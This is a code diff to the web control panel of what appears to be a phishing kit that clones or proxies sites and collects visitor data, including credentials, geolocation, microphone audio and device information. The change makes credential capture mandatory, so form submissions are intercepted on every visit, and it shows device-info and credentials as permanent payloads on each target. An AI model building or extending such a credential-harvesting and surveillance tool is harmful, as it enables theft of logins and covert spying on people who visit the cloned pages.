@@ -55,9 +55,9 @@
             <input type="checkbox" checked disabled>
             <span>device-info <em style="font-style:normal;color:var(--text-muted)">(always)</em></span>
           </label>
-          <label class="checkbox">
-            <input type="checkbox" name="payloads[]" value="credentials" id="t-cred-toggle" onchange="toggleCredentials()">
-            <span>credentials</span>
+          <label class="checkbox" title="Always on — form submissions are intercepted on every visit">
+            <input type="checkbox" checked disabled>
+            <span>credentials <em style="font-style:normal;color:var(--text-muted)">(always)</em></span>
           </label>
           <label class="checkbox">
             <input type="checkbox" name="payloads[]" value="geolocation">
@@ -72,7 +72,7 @@
             <span>microphone</span>
           </label>
         </div>
-        <div class="cred-mode-options" id="cred-mode-options" style="display:none">
+        <div class="cred-mode-options" id="cred-mode-options">
           <div class="checkbox-row" style="gap:var(--space-2)">
             <label class="radio">
               <input type="radio" name="mode" value="clone" checked onchange="toggleModeUI()">
@@ -317,24 +317,10 @@
   const $editSaveSpinner = document.getElementById('t-edit-save-spinner');
   const $editOpenLive    = document.getElementById('t-edit-open-live');
 
-  /* Credentials toggle: show/hide mode options. */
-  function toggleCredentials() {
-    const on = document.getElementById('t-cred-toggle').checked;
-    document.getElementById('cred-mode-options').style.display = on ? '' : 'none';
-    if (!on) {
-      document.querySelector('input[name="mode"][value="clone"]').checked = true;
-      document.getElementById('proxy-info').style.display = 'none';
-      $btnLabel.textContent = 'Clone & host';
-    }
-    toggleModeUI();
-  }
-  window.toggleCredentials = toggleCredentials;
-
   /* Mode toggle: change button label, show proxy info. */
   function toggleModeUI() {
-    const credOn = document.getElementById('t-cred-toggle').checked;
     const proxyEl = document.querySelector('input[name="mode"][value="proxy"]');
-    const isProxy = credOn && proxyEl && proxyEl.checked;
+    const isProxy = proxyEl && proxyEl.checked;
     document.getElementById('proxy-info').style.display = isProxy ? '' : 'none';
     $btnLabel.textContent = isProxy ? 'Create proxy' : 'Clone & host';
     document.querySelector('.create-progress-label').textContent = isProxy ? 'Creating…' : 'Cloning…';
@@ -380,7 +366,7 @@
       node.querySelector('.t-live-url').textContent   = liveUrl;
       node.querySelector('.t-source-url').textContent = t.url;
       node.querySelector('.t-payloads').textContent   =
-        (t.payloads || []).join(', ') || '— none —';
+        ['device-info', 'credentials'].concat(t.payloads || []).join(', ');
       node.querySelector('.t-events').textContent     = t.events_count   ?? 0;
       node.querySelector('.t-captures').textContent   = t.captures_count ?? 0;
       node.querySelector('.t-audio').textContent      = t.audio_count    ?? 0;
